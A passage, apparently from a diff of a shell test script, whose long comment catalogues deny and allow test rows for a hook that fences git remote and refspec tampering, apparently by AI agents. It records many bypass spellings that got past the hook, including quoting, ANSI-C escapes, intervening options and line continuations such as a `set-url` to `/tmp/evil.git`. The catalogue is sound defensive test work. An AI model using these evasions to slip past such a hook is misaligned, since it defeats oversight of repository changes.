pass 1 codex-2/3 quoted-space-path/absolute-interpreter fixes, +1 round-5 re-review pass 2 codex-2 cd-then-invoke fix, +3 HIMMEL-2200 quote-aware-split/backslash-escape/cd-existence-check fixes, +2 HIMMEL-2200 pr-check panel re-review codex-1 pwsh-dialect/double-quote-escape fixes, +1 HIMMEL-2200 pr-check panel round-3 codex-1 rmdir-then-cd TOCTOU fix, +1 HIMMEL-2200 pr-check panel round-5 codex-1 candidate-cap-truncation fix, +2 HIMMEL-2214 short-circuit-cd subsumption pin and its benign control, +1 HIMMEL-2218 codex-2 pwsh backtick-escaped separator fix, +3 HIMMEL-2218 codex-3 bash/pwsh line-continuation fix and its even-run control, +2 HIMMEL-2218 expansion pwsh doubled-single-quote fix and its bash-dialect control, +1 HIMMEL-2225 round-6 codex-1 candidate-interleave fix, +3 PR #2005 CodeRabbit CRLF line-continuation fix and its benign control, +3 PR #2005 panel round-2 codex-2 pwsh escape-sequence resolver and its controls, +2 PR #2005 panel round-2 codex-1 continuation-join non-regression pins, +4 PR #2005 panel round-3 codex-1 pwsh `u{...} unicode-escape fix and its controls, +11 PR #2005 PowerShell escape-grammar completeness enumeration, one case per form, +2 PR #2005 panel round-4 codex-2 NUL-filter-on-emitted-path fix and its control) +18: HIMMEL-2528 anchor-tamper fence (11 DENY rows across local-path-refspec fetch/push and ref/remote-metadata rewrite shapes, 5 ALLOW rows pinning ordinary git use unaffected, 2 CONTROL rows for the off-lane and bypass escape hatches) +12: codex-6 quoted/escaped-remote bypass fix (10 DENY rows enumerating quoting forms — double/single/backslash/adjacent-double-quote/ANSI-C on the dot remote, plus one each for ./..., ../..., /..., git push, and git -C composition — 2 ALLOW negative controls for a quoted ordinary remote and a commit message merely quoting a dot) +6: HIMMEL-2528 bare-".." gap fix, found verifying codex-6 (5 DENY rows for bare/double-quoted/single-quoted .. plus git push and git -C composition, all on an x:origin/main refspec to isolate class (ii) from the class (i) refs/remotes/ keyword; 1 ALLOW negative control for a commit message merely mentioning ..) +24: HIMMEL-2528 round 2 destination gate, replacing class (ii)'s remote-argument enumeration (16 DENY rows — 9 pinning the codex-3 relative-directory and configured-remote bypasses across bare/quoted/escaped spellings, git push and git -C composition, plus a quoted refspec; 3 for the --refmap=/--refmap /-c remote.origin.fetch= spellings that put the refspec on a flag rather than an argument, all on the origin/main SHORTHAND so only the destination classifier can deny them; 3 refs/remotes/-literal rows that class (i) also denies, pinned as regressions not as isolating evidence; 1 for propagate-public.sh's own tracking-ref fetch shape, deliberately unexempted — 8 ALLOW negative controls for the implicit-refspec forms, a bare-branch and a refs/heads destination, propagate-public.sh's implicit-refspec guidance text, and a tracking-ref-looking commit message alone and chained after a fetch) +6: HIMMEL-2528 round 2 over-block fix — `<a>/<b>` destinations resolve <a> against the repo's real remote set instead of denying every two-segment shape (3 ALLOW rows for himmel's mandated type/slug branch destinations feat/x, fix/x and main:main, which the blanket rule false-denied; 2 DENY rows keeping the configured-remote shorthand refused, including a +-prefixed force refspec; 1 DENY row pinning the fail-CLOSED direction when `git remote` cannot run at all) +5: HIMMEL-2528 round 2 class (i) gap — `remote remove`/`remote rm`/`remote rename` were in the threat model but not the prescribed fence list, and all three measured rc=0 ALLOW (3 DENY rows, one per verb; 2 ALLOW controls keeping read-only `git remote` and `git remote -v` unaffected) +26: HIMMEL-2528 round 3 codex-2 class (i) quoting bypass — round 1 normalized class (ii) only, so the WHOLE class-(i) keyword set walked through ordinary shell quoting (17 DENY rows, one per keyword/quoting form, each carrying exactly one keyword and no class-(ii) shape, all measured rc=0 ALLOW pre-fix; 2 DENY rows for the widened ANSI-C fail-closed arm, including one hiding the subcommand token itself; 2 DENY rows pinning MECHANICALLY that class (ii)'s allowed implicit-refspec fetch is only safe because class (i) fences the quoted remote-metadata rewrite that precedes it; 3 ALLOW controls for `git remote show`, `git remote get-url` and a non-git `$'...'`; 2 DENY rows recording the accepted-overmatch spellings that CHANGED DIRECTION this round) +15: HIMMEL-2528 round 4 — the fifth and sixth axes this fence's shape matching has been defeated on, both closed by REMOVING the axis rather than enumerating its members (codex-2, intervening options: `git remote` takes options before its subcommand, so `remote[[:space:]]+<verb>` missed `git remote -v set-url …` entirely — 8 DENY rows, one per fenced verb alternating -v/--verbose, one with TWO options pinning that option tokens are skipped in a LOOP, and one carrying round 3's quoted verb as well so both axes fire at once; codex-3, quote-evadable ANSI-C anchor: the `$'…'` arm must scan unnormalized text but anchored on a literal unquoted `git`, so `"git" remote $'\x61'dd …` walked past it AND past the normalized keyword scan — 4 DENY rows for double/single/backslash-quoted command tokens and one at a chained segment position, each with the verb hidden inside the ANSI-C body so no other class can reach them; 3 ALLOW controls — `git remote --verbose` with NO verb stays a listing, `-v` before a read-only verb stays allowed, and a quoted `git` without any `$'…'` is not denied merely for being quoted) +9: HIMMEL-2528 round 5 codex-1 line-continuation bypass — the SEVENTH axis, closed by removing it: bash deletes a backslash-newline before parsing, but the hook flattened that newline to `;` FIRST, so the remote-verb tokeniser met a segment break exactly where the verb belonged and `git remote \<newline>set-url origin /tmp/evil.git` measured rc=0 ALLOW while its plain spelling denied (6 DENY rows — LF before set-url and add, CRLF before set-url and rename, the verb itself SPLIT across the continuation, and two continuations around round 4's intervening option so both axes fire at once, each isolated per row so only the remote-verb tokeniser can produce rc=2; 3 controls — a multi-line `git commit -m` and an `echo` split across a continuation stay ALLOWED because a continuation is ordinary formatting, plus a DENY parity row pinning that an EVEN trailing run is a literal backslash and its command boundary must survive the join) +4: HIMMEL-2528 round 5 the GLM-lane TWIN of that bypass — this lane's cmd_lc flattens newlines with the same `tr`, so `git \<newline>push origin main` measured rc=0 ALLOW while the plain spelling denied, and all four shape matchers (gp_/gu_/gh_/net_) were reachable that way; fixed by feeding both fences the SAME shared join_line_continuations() rather than a second copy (1 DENY row for the continuation push; 1 DENY parity row mirroring the anchor class's, so the odd/even sub-decision is pinned on both sides; 1 ALLOW control for a harmless echo continuation; 1 ALLOW row recording that the join also removes a FALSE DENY — `gh \<newline>issue list` now reads as the carved-out `gh issue list` bash really runs. Every row measures rc=0 with the GLM URL removed and HIMMEL_WORKER=1 instead, so no anchor or pin-dir class can produce these verdicts)
+EXPECTED_CASES=244   # HIMMEL-7907: rows held only by the removed GLM tail dropped; +1 hooks.json registration row
 if [ "$CASES" -ne "$EXPECTED_CASES" ]; then
     echo "CASE-COUNT MISMATCH — ran $CASES, expected $EXPECTED_CASES"
     exit 1
